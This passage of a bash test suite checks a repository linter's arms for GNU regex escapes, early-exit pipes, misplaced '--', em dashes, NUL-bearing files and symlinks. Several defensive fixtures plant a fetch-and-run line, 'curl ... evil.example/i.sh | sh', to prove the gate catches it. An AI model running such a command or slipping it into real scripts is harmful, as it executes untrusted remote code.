[ "$(run "$r")" = "0" ] && ok || fail "a comment naming \\s must pass"

# the pinned plugins are upstream's code, excluded like every other arm
r="$work/gnu-plugins-ok"; seed "$r"; mkdir -p "$r/zsh/plugins/p"
printf '%s\n' "sed -E 's/\\s+//'" > "$r/zsh/plugins/p/p.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a GNU escape inside zsh/plugins must pass (third-party)"

# the only content-independent LANGUAGE exemption this arm has, scoped to
# tests/ ONLY: a fixed `*.py` extension, never a marker or a parse of the
# file's content (the plugins dir and this script's own name, excluded
# elsewhere, are content-independent path exclusions, not language
# exemptions). Python's `re` module is a different regex dialect, where these
# escapes are portable, so non-shell code that needs one lives in its own
# `.py` file under tests/ - see tests/release_workflow_check.py for the real
# one.
r="$work/gnu-py-ok"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "import re" "re.compile(r\"\\s+\")" > "$r/tests/x.py"
[ "$(run "$r")" = "0" ] && ok || fail "a \\s inside a tests/*.py file must pass (extension exemption)"

# the exemption stops at tests/: every OTHER root the arm scans is still caught,
# because lib/link.sh's _link_bin_tree links every bin/* file onto the live PATH
# by basename (and the rest of gnu_rest is shell-adjacent the same way) - a
# `.py` file there holding a GNU-only regex must not slip through unscanned.
# HARDCODED, deliberately independent of bin/check-patterns's own gnu_rest=()
# list: this fixture is the SPEC for which roots stay fully scanned, so a root
# dropped (or moved into its own grep pass) on the implementation side must
# fail here, not silently shrink alongside it. install.sh and Makefile are
# single FILES, not directories, so a "*.py under install.sh" cannot exist and
# they have no fixture of their own.
gnu_rest_dirs=(lib bin zsh .github/workflows)
for d in "${gnu_rest_dirs[@]}"; do
  r="$work/gnu-py-still-caught-${d//\//-}"; seed "$r"; mkdir -p "$r/$d"
  printf '%s\n' "import re" "re.compile(r\"\\s+\")" > "$r/$d/x.py"
  fails_with "$r" "$gnu_msg" "a \\s in $d/x.py must still fail (exemption is tests/-only)"
done

# the exemption is the FILE, not the escape: the same content in a `.sh` file is
# still caught, proving arm 8 was not accidentally weakened for the shell surface.
r="$work/gnu-sh-still-caught"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "import re" "re.compile(r\"\\s+\")" > "$r/tests/x.sh"
fails_with "$r" "$gnu_msg" "the same \\s in a .sh file must still fail"

# a heredoc is shell-surface TEXT to this arm - it has no notion of an embedded
# language, so a python3 heredoc left inside a `.sh` script is still caught. The
# extension exemption only helps once the body is actually moved to its own file.
r="$work/gnu-heredoc-still-caught"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "python3 - <<'PY'" "import re" "re.compile(r\"\\s+\")" "PY" > "$r/tests/x_test.sh"
fails_with "$r" "$gnu_msg" "a \\s inside a python3 heredoc in a .sh file must still fail"

# the filter is an EXACT suffix `.py`, not "contains py": neither a double
# extension nor a name that merely starts with the letters buys the exemption.
r="$work/gnu-py-suffix-exact"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "import re" "re.compile(r\"\\s+\")" > "$r/tests/x.py.sh"
fails_with "$r" "$gnu_msg" "a \\s in x.py.sh (not a .py file) must still fail"

r="$work/gnu-py-prefix-only"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "import re" "re.compile(r\"\\s+\")" > "$r/tests/xpy"
fails_with "$r" "$gnu_msg" "a \\s in a file named xpy (no .py suffix) must still fail"

# --- REGRESSION: a hit in BOTH gnu_rest and gnu_tests prints $gnu_msg ONCE ----
# The two-block form used to gate each pass's OWN "if viol; then print
# $gnu_msg", so a hit in both passes printed the message twice.
r="$work/gnu-both-passes-hit"; mkdir -p "$r/lib" "$r/tests"
printf 'noop() { : ; }\n' > "$r/lib/os.sh"
printf '%s\n' "sed -E 's/\\s+//'" > "$r/lib/x.sh"
printf '%s\n' "sed -E 's/\\s+//'" > "$r/tests/x_test.sh"
out="$(STRICT= "$cp" "$r" 2>&1)" || true
count=$(printf '%s\n' "$out" | grep -c "$gnu_msg")
[ "$count" = "1" ] && ok || fail "\$gnu_msg must print exactly once even when both gnu-arm passes hit (got $count)"

# --- FAIL CLOSED, each pass separately (its own call site, its own bug to
# regress into) - a hit in one arm's grep call must not depend on the OTHER
# call site's fail-closed handling still being wired up. Other arms (1, 2, 5,
# 6, 9, 10...) also scan lib/ and tests/ and would fail closed on the same
# unreadable dir, so a bare nonzero exit does not prove arm 8 is the one
# failing - each pass's message names ITS OWN pass ("non-tests/" vs "tests/").
# check-patterns's _gnu_fail (bin/check-patterns) couples that message to
# `bad=1` as one call, so a call site that stops calling it loses its message
# too, which these two fixtures catch; an inline reimplementation that keeps
# the printf but drops `bad=1` would NOT be caught here. Root-skipped for the
# same `chmod 000` reason as the general fail-closed case above - see that
# comment for what was tried instead.
gnu_rest_err_msg="check-patterns: GNU-regex scan (non-tests/ pass) errored"
gnu_tests_err_msg="check-patterns: GNU-regex scan (tests/ pass) errored"
if [ "$(id -u)" -ne 0 ]; then
  r="$work/gnu-rest-failclosed"; seed "$r"; mkdir -p "$r/lib/locked"
  chmod 000 "$r/lib/locked"
  fails_with_rc 2 "$r" "$gnu_rest_err_msg" "arm 8's non-tests/ (gnu_rest) pass must fail closed on an unreadable dir"
  chmod u+rwx "$r/lib/locked"
else
  echo "  SKIP: running as root - cannot exercise arm 8's gnu_rest fail-closed case"
fi

if [ "$(id -u)" -ne 0 ]; then
  r="$work/gnu-tests-failclosed"; seed "$r"; mkdir -p "$r/tests/locked"
  chmod 000 "$r/tests/locked"
  fails_with_rc 2 "$r" "$gnu_tests_err_msg" "arm 8's tests/ (gnu_tests) pass must fail closed on an unreadable dir"
  chmod u+rwx "$r/tests/locked"
else
  echo "  SKIP: running as root - cannot exercise arm 8's gnu_tests fail-closed case"
fi

# --- REGRESSION: hits print in a single STABLE (sorted) order, not pass order
# or filesystem readdir order. gnu_rest's array lists zsh/ BEFORE Makefile, so
# an unsorted combined result would show the zsh/ hit first; sorted (LC_ALL=C,
# path then line number), Makefile sorts first ('M' < 'z'). Deterministic by
# construction - it does not depend on readdir order at all.
r="$work/gnu-sort-order"; seed "$r"; mkdir -p "$r/zsh"
printf '%s\n' "sed -E 's/\\s+//'" > "$r/zsh/x.zsh"
printf '%s\n' "y=\"\$(sed -E 's/\\s+//' <<<\"\$x\")\"" > "$r/Makefile"
out="$(STRICT= "$cp" "$r" 2>&1)" || true
makefile_pos=$(printf '%s\n' "$out" | grep -n '/Makefile:' | sed -n '1p' | cut -d: -f1)
zsh_pos=$(printf '%s\n' "$out" | grep -n '/zsh/x\.zsh:' | sed -n '1p' | cut -d: -f1)
if [ -n "$makefile_pos" ] && [ -n "$zsh_pos" ] && [ "$makefile_pos" -lt "$zsh_pos" ]; then
  ok
else
  fail "gnu-arm hits must print in a stable sorted order (Makefile before zsh/x.zsh), got positions '$makefile_pos'/'$zsh_pos': $out"
fi

# === the early-exit-reader arm ===================================================
# `grep -q` / `head` on the right of a pipe exit before the writer is done; under
# pipefail the writer's SIGPIPE fails the pipeline at random. Fixtures spell the
# pipe through $P, so THIS file's own source never carries the shape the arm
# looks for (the arm scans tests/).
eex_msg="check-patterns: an early-exit reader"
P='|'
i=0
for line in \
  "printf '%s\\n' \"\$out\" $P grep -q 'usage' || fail x" \
  "if find \"\$HOME\" $P grep -q .; then fail x; fi" \
  "x=\"\$(LC_ALL=C grep a f $P LC_ALL=C grep -qF b)\"" \
  "  $P grep -qE '(^|[^[:alnum:]_-])canga' ; then" \
  "cmd $P grep -E -q x" \
  "cmd $P grep -m1 x" \
  "cmd $P grep --quiet x" \
  "cmd $P grep -l x" \
  "cmd $P& grep -q x" \
  "cmd $P egrep -q x" \
  "cmd $P fgrep -q x" \
  "v=\"\$(tmux ls $P head -1)\"" \
  ; do
  i=$((i + 1)); r="$work/eex-$i"; seed "$r"; mkdir -p "$r/tests"
  printf '%s\n' "$line" > "$r/tests/x_test.sh"
  fails_with "$r" "$eex_msg" "early-exit reader shape $i: $line"
done
# lib/ (sourced by install.sh) and the workflows are on the surface too
r="$work/eex-lib"; seed "$r"
printf '%s\n' "cur=\"\$(git status $P grep -q x)\"" > "$r/lib/tool.sh"
fails_with "$r" "$eex_msg" "an early-exit reader in lib/"
r="$work/eex-ci"; seed "$r"; mkdir -p "$r/.github/workflows"
printf '%s\n' "          xz --version $P head -1" > "$r/.github/workflows/ci.yml"
fails_with "$r" "$eex_msg" "head in a workflow run step"

# the fixes, and readers that drain their input, pass
r="$work/eex-ok"; seed "$r"; mkdir -p "$r/tests" "$r/zsh"
printf '%s\n' \
  "grep -q 'usage' <<<\"\$out\" || fail x" \
  "grep -qw reuse <<<\"\$(grep -E '^local-ci:' Makefile)\"" \
  "if [ -n \"\$(find \"\$HOME\" -mindepth 1)\" ]; then fail x; fi" \
  "n=\"\$(cmd $P grep -c x || true)\"" \
  "bad=\"\$(cmd $P grep -vE '^#' || true)\"" \
  "a || grep -q x f" \
  "v=\"\$(cmd $P sed -n 1p)\"" \
  "cmd $P headers" \
  "# never pipe into grep -q: cmd $P grep -q x" > "$r/tests/x_test.sh"
# zsh/ is interactive (no pipefail) and outside the arm's surface
printf '%s\n' "alias ducks='du -cks -- *(D) $P sort -rn $P head'" > "$r/zsh/aliases.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "here-strings, draining readers, comments and zsh/ must pass the early-exit arm"

# === the misplaced `--` arm =======================================================
# BSD getopt (macOS) stops at the first operand, so a `--` after it is a FILE
# operand; GNU getopt permutes argv and accepts either order. Fixtures spell the
# delimiter through $D, so THIS file's own source never carries the shape the arm
# looks for (the arm scans tests/).
dd_msg="check-patterns: a '--' after the first operand"
D='--'
i=0
for line in \
  "  chmod -R go-w $D \"\$plugins\" 2>/dev/null \\" \
  "grep -q \"\$pat\" $D \"\$f\" || fail x" \
  "if ! /bin/rm -f \"\$x\" $D; then :; fi" \
  "x=\"\$(sed -n 1p \"\$f\" $D)\"" \
  "sudo chown root:wheel $D /x" \
  "mkdir -m 700 \"\$d\" $D" \
  "LC_ALL=C grep -e a -qF \"\$b\" $D f" \
  "a && cp \"\$a\" $D \"\$b\"" \
  "elif mv \"\$a\" $D \"\$b\"; then :; fi" \
  "  x) rm -f \"\$d\" $D ;;" \
  "grep -em pat $D f" \
  "grep -fe pat $D f" \
  "touch -Ar ref $D f" \
  ; do
  i=$((i + 1)); r="$work/dd-$i"; seed "$r"; mkdir -p "$r/tests"
  printf '%s\n' "$line" > "$r/tests/x_test.sh"
  fails_with "$r" "$dd_msg" "misplaced -- shape $i: $line"
done
# zsh/ and the workflows run on a mac too
r="$work/dd-zsh"; seed "$r"; mkdir -p "$r/zsh"
printf '%s\n' "  ln -s \"\$src\" $D \"\$dst\"" > "$r/zsh/functions.zsh"
fails_with "$r" "$dd_msg" "a misplaced -- in zsh/"
r="$work/dd-ci"; seed "$r"; mkdir -p "$r/.github/workflows"
printf '%s\n' "      - run: chmod u+x $D bin/x" > "$r/.github/workflows/ci.yml"
fails_with "$r" "$dd_msg" "a misplaced -- in a workflow run step"

# the fix, argument-taking options, quoted patterns and non-command positions pass
r="$work/dd-ok"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' \
  "chmod -R $D go-w \"\$p\" 2>/dev/null" \
  "rm -f $D \"\$x\"; mv -f $D \"\$a\" \"\$b\"" \
  "grep -qE $D \"\$pat\" f" \
  "grep -e \"\$pat\" $D f" \
  "grep -qF -m 1 $D x f" \
  "mkdir -m 700 $D \"\$d\"" \
  "sed -e 's/a/b/' $D f" \
  "sed -i '' -e 's/a/b/' $D f" \
  "grep -qx 'install --pin v1 $D gh' <<<\"\$c\"" \
  "grep -qF \"a; b $D c\" f" \
  "git grep -h -E pat $D ." \
  "echo chmod x $D y" \
  "gh extension install --pin \"\$p\" $D \"\$r\"" \
  "ck x \"\$(cat \"\$f\")\" \"run --env-file e $D restic\"" \
  "# never write chmod -R go-w $D x" \
  "case \$x in a) rm -f $D \"\$d\" ;; esac" \
  "elif mv -f $D \"\$a\" \"\$b\"; then :; fi" \
  "grep -em $D pat f" > "$r/tests/x_test.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a leading --, option arguments, quoted text and non-command words must pass the -- arm"

# DOCUMENTED GAPS, pinned: the arm does not see these shapes today. A change that
# starts catching one must update the arm's NOT-covered list and this
# fixture together, so coverage never moves silently.
r="$work/dd-gaps"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' \
  "\$CHMOD -R go-w $D \"\$d\"" \
  "sudo -n chmod -R go-w $D \"\$d\"" \
  "find . -exec chmod go-w $D {} +" \
  "chmod -R go-w \\" \
  "  $D \"\$d\"" > "$r/tests/x_test.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a documented gap of the -- arm (\$CMD, sudo options, find -exec, a \\ continuation) is now caught - update the arm's NOT-covered list"

# === the em-dash arm =============================================================
# House style (CONTRIBUTING.md's community standards and .claude/rules/docs.md's
# documentation standard) is a plain hyphen; the arm forbids the Unicode em dash
# (U+2014) anywhere in the repo's own prose, comments included - unlike arms
# (5)-(10) it does NOT strip comments first (the same reasoning arms (1)-(2) use
# for curl|sh and uname -m: a forbidden shape in a comment is still the shape).
# The byte sequence is built at RUNTIME from its UTF-8 bytes ($'\xe2\x80\x94'),
# never pasted as a literal character into this test file - a literal here
# would trip check-patterns's own em-dash arm on its own test suite.
em_dash_msg="check-patterns: an em dash"
em_dash=$'\xe2\x80\x94'
en_dash=$'\xe2\x80\x93'

# a shell comment carrying an em dash is caught - comments are prose too.
r="$work/emdash-comment"; seed "$r"
printf '# a note %s a trailing clause\n' "$em_dash" > "$r/lib/note.sh"
fails_with "$r" "$em_dash_msg" "an em dash in a shell comment"

# a Markdown file carrying an em dash is caught.
r="$work/emdash-md"; seed "$r"; mkdir -p "$r/docs"
printf 'A sentence %s a trailing clause.\n' "$em_dash" > "$r/docs/note.md"
fails_with "$r" "$em_dash_msg" "an em dash in a Markdown file"

# a zsh file carrying an em dash is caught.
r="$work/emdash-zsh"; seed "$r"; mkdir -p "$r/zsh"
printf '# prompt segment %s status\n' "$em_dash" > "$r/zsh/prompt.zsh"
fails_with "$r" "$em_dash_msg" "an em dash in a zsh file"

# the allowlisted lazy.nvim lockfile is exempt even though it sits inside the
# otherwise-scanned config/ tree - lazy.nvim rewrites it wholesale on every sync.
r="$work/emdash-allowlisted"; seed "$r"; mkdir -p "$r/config/nvim"
printf '{ "note": "a sentence %s a trailing clause" }\n' "$em_dash" > "$r/config/nvim/lazy-lock.json"
[ "$(run "$r")" = "0" ] && ok || fail "config/nvim/lazy-lock.json must be exempt from the em-dash arm"

# a plain hyphen and an en dash both pass - the arm targets exactly U+2014.
r="$work/emdash-clean"; seed "$r"; mkdir -p "$r/docs"
printf 'a sentence - with a plain hyphen, and a range 3%s5 too\n' "$en_dash" > "$r/docs/note.md"
[ "$(run "$r")" = "0" ] && ok || fail "a plain hyphen and an en dash must both pass the em-dash arm"

# --- the lazy-lock exemption is ANCHORED to the PATH:NN: field, never a
# substring match anywhere on the hit line -----------------------------------
# REGRESSION: an earlier version (`(^|/)config/nvim/lazy-lock\.json:`) exempted
# any hit line where that text was preceded by line-start OR a bare `/` -
# ANYWHERE on the PATH:NN:CONTENT line, not just in the PATH field. A docs
# sentence that names the exempted path with a leading slash (as in a full
# path shown to a reader, "/repo/config/nvim/lazy-lock.json:") reproduces the
# bypass: the CONTENT half alone satisfies `(^|/)`, so the whole hit line was
# wrongly exempted even though the VIOLATION is in docs/, not the lockfile.
# (A mention with no leading slash, e.g. a bare "config/nvim/lazy-lock.json:",
# does NOT reproduce it - `(^|/)` still requires line-start or a slash right
# before "config", so this fixture must use the slash-prefixed form to
# actually exercise the bug; verified by running it against the pre-fix
# pattern before writing this comment.)
r="$work/emdash-anchor-bypass"; seed "$r"; mkdir -p "$r/docs"
printf 'See /repo/config/nvim/lazy-lock.json: it drifts %s investigate.\n' "$em_dash" > "$r/docs/other.md"
fails_with "$r" "$em_dash_msg" "a file that only MENTIONS a slash-prefixed config/nvim/lazy-lock.json: text (not the file itself) must still fail"

# --- REGRESSION: the CURRENT (start-of-PATH-field) anchor still accepted ANY
# leading directory segment before "config/nvim/lazy-lock.json:", so a DECOY
# file at a different real path ending in those same segments (still inside
# the scanned config/ tree) was wrongly exempted too - fail-OPEN (reproduced
# against the pre-fix pattern: exit 0, expected non-zero). The real
# config/nvim/lazy-lock.json above must still be exempt; this fixture proves a
# LOOK-ALIKE path elsewhere does not ride along on that exemption.
r="$work/emdash-lazylock-decoy-file"; seed "$r"; mkdir -p "$r/tests/config/nvim" "$r/config/nvim"
printf '{ "note": "a sentence %s a trailing clause" }\n' "$em_dash" > "$r/tests/config/nvim/lazy-lock.json"
printf '{ "note": "a sentence %s a trailing clause" }\n' "$em_dash" > "$r/config/nvim/lazy-lock.json"
fails_with "$r" "$em_dash_msg" "a decoy tests/config/nvim/lazy-lock.json (not the real allowlisted path) must still fail"

# --- $root is caller-supplied, so the exact-path exemption ERE-escapes it
# (_re_escape): under a root holding an ERE metacharacter the real lock file
# stays exempt (unescaped, `root+` reads as "roo" then one or more `t`, which
# the literal `root+/` never matches), and a decoy that only an unescaped `.`
# would match (lazy-lockXjson) is still flagged -----------------------------
for re_root in 'root.x' 'root+'; do
  r="$work/emdash-re-$re_root"; seed "$r"; mkdir -p "$r/config/nvim"
  printf '{ "note": "a sentence %s a trailing clause" }\n' "$em_dash" > "$r/config/nvim/lazy-lock.json"
  [ "$(run "$r")" = "0" ] && ok \
    || fail "a root named '$re_root': config/nvim/lazy-lock.json must still be exempt"
  printf '{ "note": "a sentence %s a trailing clause" }\n' "$em_dash" > "$r/config/nvim/lazy-lockXjson"
  fails_only_with "$r" "$em_dash_msg" "a root named '$re_root': a decoy config/nvim/lazy-lockXjson must still fail"
done

# --- a NUL-bearing file where the arms read FAILS CLOSED (exit 2) ----------
# grep reads a file with a NUL byte as binary, and the arms' old `-I` then
# skipped it whole: a NUL beside the em dash below passed (exit 0), and so
# did a NUL appended to bin/check-patterns beside a planted fetch (measured).
# The gate now refuses the file: exit 2 and nul_msg, the path printed, for a
# NUL at the start of a small file, a NUL past GNU grep's binary sample in a
# 300 KB file (which `grep -lI ''` still lists as text), a NUL in the gate's
# own source, and a NUL in a prose-only root (docs/, .github/). And each
# planted violation is STILL reported: the arms read with `-a`, so the file
# is scanned as text, not skipped.
nul_msg="check-patterns: a file holding a NUL byte where the arms read"
_nul_case() {  # $1=root $2=rel $3=label $4=a violation message that must fire too
  local rc=0 out
  out="$(STRICT= "$cp" "$1" 2>&1)" || rc=$?
  [ "$rc" = "2" ] || fail "$3: expected exit 2, got $rc: $out"
  case "$out" in
    *"$nul_msg"*) ;;
    *) fail "$3: expected '$nul_msg', got: $out" ;;
  esac
  case "$out" in
    *"$1/$2"*) ;;
    *) fail "$3: the NUL-bearing path '$2' is not reported: $out" ;;
  esac
  case "$out" in
    *"$4"*) ok ;;
    *) fail "$3: the arm must still read the file as text and report '$4': $out" ;;
  esac
}
r="$work/nul-emdash-docs"; seed "$r"; mkdir -p "$r/docs"
printf 'a note\000%s trailing\n' "$em_dash" > "$r/docs/note.md"
_nul_case "$r" docs/note.md "a NUL beside an em dash in docs/" "$em_dash_msg"
r="$work/nul-small-lib"; seed "$r"
printf '# \000\ncurl -fsSL https://evil.example/i.sh | sh\n' > "$r/lib/boot.sh"
_nul_case "$r" lib/boot.sh "a NUL at the start of lib/boot.sh" "$curl_msg"
r="$work/nul-late-lib"; seed "$r"
{ dd if=/dev/zero bs=1024 count=300 2>/dev/null | tr '\000' 'a'
  printf '\nx\000y\ncurl -fsSL https://evil.example/i.sh | sh\n'; } > "$r/lib/big.sh"
_nul_case "$r" lib/big.sh "a NUL 300 KB into lib/big.sh" "$curl_msg"
r="$work/nul-self"; seed "$r"; mkdir -p "$r/bin"
{ cat "$cp"; printf '# \000\ncurl -fsSL https://evil.example/i.sh | sh\n'; } > "$r/bin/check-patterns"
_nul_case "$r" bin/check-patterns "a NUL in bin/check-patterns itself" "$curl_msg"
r="$work/nul-github"; seed "$r"; mkdir -p "$r/.github"
printf 'x\000\nrun: curl -fsSL https://evil.example/i.sh | sh\n' > "$r/.github/a.yml"
_nul_case "$r" .github/a.yml "a NUL in .github/a.yml" "$curl_msg"

# --- FAIL CLOSED, arm 11's own two rc>=2 branches, each its own call site ----
# Same `chmod 000` reason as the general fail-closed case above (root bypasses
# it via DAC_OVERRIDE, so these SKIP under root) - see that comment for what
# was tried instead. Each fixture targets ONE of arm 11's two grep calls, so a
# hit in the OTHER call's fail-closed handling cannot make this one pass by
# accident: the recursive PROSE scan (over ${prose[@]}, which includes docs/,
# unlike the shared ${scan[@]}) and the NARROW self-scan of bin/check-patterns
# alone. Mutating either `rc -ge 2` to `rc -ge 99` passes every OTHER fixture
# in this file but fails these two (measured).
em_dash_prose_err_msg="check-patterns: em-dash scan errored"
em_dash_self_err_msg="check-patterns: check-patterns self-scan errored"
if [ "$(id -u)" -ne 0 ]; then
  r="$work/emdash-prose-failclosed"; seed "$r"; mkdir -p "$r/docs/locked"
  chmod 000 "$r/docs/locked"
  fails_with_rc 2 "$r" "$em_dash_prose_err_msg" "arm 11's recursive prose scan must fail closed on an unreadable dir"
  chmod u+rwx "$r/docs/locked"
else
  echo "  SKIP: running as root - cannot exercise arm 11's prose-scan fail-closed case"
fi

if [ "$(id -u)" -ne 0 ]; then
  r="$work/emdash-self-failclosed"; seed "$r"; mkdir -p "$r/bin"
  printf '#!/usr/bin/env bash\n# a plain note\n' > "$r/bin/check-patterns"
  chmod 000 "$r/bin/check-patterns"
  fails_with_rc 2 "$r" "$em_dash_self_err_msg" "arm 11's narrow self-scan of bin/check-patterns must fail closed on an unreadable file"
  chmod u+rwx "$r/bin/check-patterns"
else
  echo "  SKIP: running as root - cannot exercise arm 11's self-scan fail-closed case"
fi

# --- a check-patterns-named file ELSEWHERE (not bin/check-patterns) fails
# CLOSED --------------------------------------------------------------------
# Every recursive arm keeps `--exclude=check-patterns` (tests/plugins_test.sh's
# invariant), a BASE-NAME match at any depth, so such a file is never scanned.
# Arm 12 refuses it instead, exit 2. Its own fixtures, with the nested and the
# tracked cases, sit beside arm 12's other file-name rules below.
r="$work/emdash-elsewhere"; seed "$r"; mkdir -p "$r/lib"
printf '# a note %s trailing\n' "$em_dash" > "$r/lib/check-patterns"
[ "$(run "$r")" = "2" ] && ok || fail "a file named check-patterns OUTSIDE bin/ must fail the gate closed (exit 2)"

# --- an em dash literally in bin/check-patterns itself IS caught ------------
# REGRESSION: the recursive scan's `--exclude=check-patterns` above means it
# never sees this exact path, and nothing else in the repo checked it either -
# measured before this fixture existed: appending an em dash to a scratch copy
# of bin/check-patterns and running the real gate against it exited 0. The
# narrow, non-recursive self-scan closes that gap.
r="$work/emdash-self"; seed "$r"; mkdir -p "$r/bin"
printf '#!/usr/bin/env bash\n# a note %s trailing\n' "$em_dash" > "$r/bin/check-patterns"
fails_with "$r" "$em_dash_msg" "an em dash literally in bin/check-patterns must be caught by the narrow self-scan"

# --- an em dash inside a pinned zsh plugin is exempt (third-party code) -----
r="$work/emdash-plugins-exempt"; seed "$r"; mkdir -p "$r/zsh/plugins/some-plugin"
printf '# note %s trailing\n' "$em_dash" > "$r/zsh/plugins/some-plugin/some-plugin.plugin.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "an em dash inside zsh/plugins/ must be exempt (third-party code)"

# --- every non-${scan[@]} prose-surface member is covered - a silent rename --
# must fail loudly. HARDCODED, deliberately independent of bin/check-patterns's
# own `_scan_roots ...` list (the same reasoning as the -- arm's dd fixtures
# above): if a future edit renames or drops one of these 15 members from the
# real `prose` array, this loop keeps asserting against the OLD list and the
# corresponding case starts failing, rather than silently testing nothing.
# Directory members get a nested probe file; file members get an em dash
# written directly into them (safe: these are scratch fixture trees, never
# the real repo).
i=0
for member in docs tests .github .claude Makefile REUSE.toml cliff.toml \
    .gitleaks.toml .gitignore .gitmodules CLAUDE.md CONTRIBUTING.md \
    SECURITY.md THIRD-PARTY-NOTICES.md README.md; do
  i=$((i + 1)); r="$work/emdash-surface-$i"; seed "$r"
  case "$member" in
    docs | tests | .github | .claude)
      mkdir -p "$r/$member"
      printf 'a note %s trailing\n' "$em_dash" > "$r/$member/probe.txt"
      ;;
    *)
      printf 'a note %s trailing\n' "$em_dash" > "$r/$member"
      ;;
  esac
  fails_with "$r" "$em_dash_msg" "prose-surface member $i/15 ('$member') must be scanned for an em dash"
done

# === arm (12): a symlink where a recursive scan reads =========================
# A symlink there hides its target from every recursive arm above (see
# bin/check-patterns). ALWAYS: every symlink on disk over `prose`, the arm
# (11) surface. ADDITIONALLY, when $root has a .git of its own: the whole
# repository, tracked only, for a symlink outside `prose` and a gitlink that is
# not a pinned plugin.
sym_msg="check-patterns: a symlink where a recursive scan reads"
sym_git_msg="check-patterns: a tracked symlink, or a gitlink that is not a pinned plugin"
sym_git_err_msg="check-patterns: symlink scan (git ls-files, repo-wide) errored"
sym_git_stderr_msg="check-patterns: symlink scan (git ls-files, repo-wide) wrote to stderr"
sym_git_record_msg="check-patterns: symlink scan (git ls-files, repo-wide) returned a malformed record"
sym_nogit_msg="check-patterns: symlink scan (git, repo-wide) cannot run: git is not on PATH"
sym_probe_msg="check-patterns: symlink scan (git, repo-wide) could not resolve the toplevel"
sym_top_msg="check-patterns: symlink scan (git, repo-wide) resolved a different toplevel"
sym_find_err_msg="check-patterns: symlink scan (find) errored"
plugins_msg="check-patterns: an entry under zsh/plugins/ that is not a pinned plugin"

# _git_repo DIR - a minimal scratch git repo, gpgsign off, author fixed so the
# fixture never depends on this machine's git config existing.
_git_repo() {
  mkdir -p "$1"
  git init -q "$1"
  git -C "$1" config user.email a@x
  git -C "$1" config user.name a
  git -C "$1" config commit.gpgsign false
}

# --- REGRESSION: a leaked GIT_DIR must not redirect this file's OWN
# _git_repo/sym-git fixtures into whatever repository it points at. Re-runs
# this whole file as a subprocess with GIT_DIR/GIT_WORK_TREE aimed at a
# scratch sentinel repo under /tmp (never a real checkout) and asserts the
# sentinel is unchanged afterward: HEAD, and the config and index a stray
# `git config` or `git add` would write without committing. The copy runs at
# _CPT_DEPTH=1, which skips this block and runs every other assertion.
if [ "$_CPT_DEPTH" -eq 0 ]; then
  sentinel="$work/leak-sentinel"; _git_repo "$sentinel"
  printf 'baseline\n' > "$sentinel/f"; git -C "$sentinel" add -A
  git -C "$sentinel" commit -qm baseline
  head_before="$(git -C "$sentinel" rev-parse HEAD)"
  config_before="$(cksum < "$sentinel/.git/config")"
  index_before="$(cksum < "$sentinel/.git/index")"
  leak_rc=0; leak_log="$work/leak-child.log"
  _CPT_DEPTH=$((_CPT_DEPTH + 1)) GIT_DIR="$sentinel/.git" GIT_WORK_TREE="$sentinel" \
    bash "$repo_root/tests/check_patterns_test.sh" > "$leak_log" 2>&1 || leak_rc=$?
  if [ "$leak_rc" -ne 0 ]; then
    cat "$leak_log" >&2
    fail "this suite must still pass under a leaked GIT_DIR (rc $leak_rc, output above)"
  fi
  ok
  [ "$head_before" = "$(git -C "$sentinel" rev-parse HEAD)" ] \
    && ok || fail "a leaked GIT_DIR must not let a fixture commit into the sentinel repo"
  [ "$config_before" = "$(cksum < "$sentinel/.git/config")" ] \
    && ok || fail "a leaked GIT_DIR must not let a fixture write the sentinel repo's config"
  [ "$index_before" = "$(cksum < "$sentinel/.git/index")" ] \
    && ok || fail "a leaked GIT_DIR must not let a fixture write the sentinel repo's index"
else
  echo "  SKIP: nested run (_CPT_DEPTH=$_CPT_DEPTH) - the leaked-GIT_DIR regression runs at depth 0 only"
fi

# --- per-member parity: every prose member, planted with a symlink, is
# caught by the always-on find pass. Same shape as the em dash loop above,
# HARDCODED independent of check-patterns' own arrays - a silent rename or
# drop must fail loudly here too. Non-git fixtures, so this exercises find
# alone, never the repo-wide git pass.
i=0
for member in install.sh lib bin zsh config packages security home \
    docs tests .github .claude Makefile REUSE.toml cliff.toml \
    .gitleaks.toml .gitignore .gitmodules CLAUDE.md CONTRIBUTING.md \
    SECURITY.md THIRD-PARTY-NOTICES.md README.md; do
  i=$((i + 1)); r="$work/sym-surface-$i"; seed "$r"
  case "$member" in
    lib | bin | zsh | config | packages | security | home | docs | tests | .github | .claude)
      mkdir -p "$r/$member"
      ln -s ./nonexistent-target "$r/$member/evil-link"
      ;;
    *)
      ln -s ./nonexistent-target "$r/$member"
      ;;
  esac
  fails_with "$r" "$sym_msg" "surface member $i/23 ('$member') must be scanned for a symlink"
done

# --- an UNTRACKED symlink at a git toplevel is still caught (find is
# always-on, regardless of git) ----------------------------------------------
r="$work/sym-untracked-toplevel"; _git_repo "$r"; seed "$r"
git -C "$r" add -A && git -C "$r" commit -qm init
ln -s ./nonexistent-target "$r/lib/evil-link"
fails_with "$r" "$sym_msg" "an untracked symlink at a git toplevel must still fail the gate"

# --- a TRACKED symlink OUTSIDE prose is caught by the repo-wide git pass,
# which find alone (surface-scoped) cannot see -------------------------------
r="$work/sym-git-outside"; _git_repo "$r"; seed "$r"; mkdir -p "$r/outside"
git -C "$r" add -A && git -C "$r" commit -qm init
ln -s ../target "$r/outside/evil-link"; printf 'x\n' > "$r/target"
git -C "$r" add -A && git -C "$r" commit -qm "add symlink outside prose"
fails_with "$r" "$sym_git_msg" "a tracked symlink OUTSIDE prose must fail via the repo-wide git pass"

# --- case-sensitivity: pathspec matching plays no part any more (the git
# pass takes none), so a tracked symlink under a differently-cased path is
# still caught -----------------------------------------------------------
r="$work/sym-case"; _git_repo "$r"; seed "$r"; mkdir -p "$r/Config"
git -C "$r" add -A && git -C "$r" commit -qm init
ln -s ../target "$r/Config/p.sh"; printf 'x\n' > "$r/target"
git -C "$r" add -A && git -C "$r" commit -qm "add case-mismatched symlink"
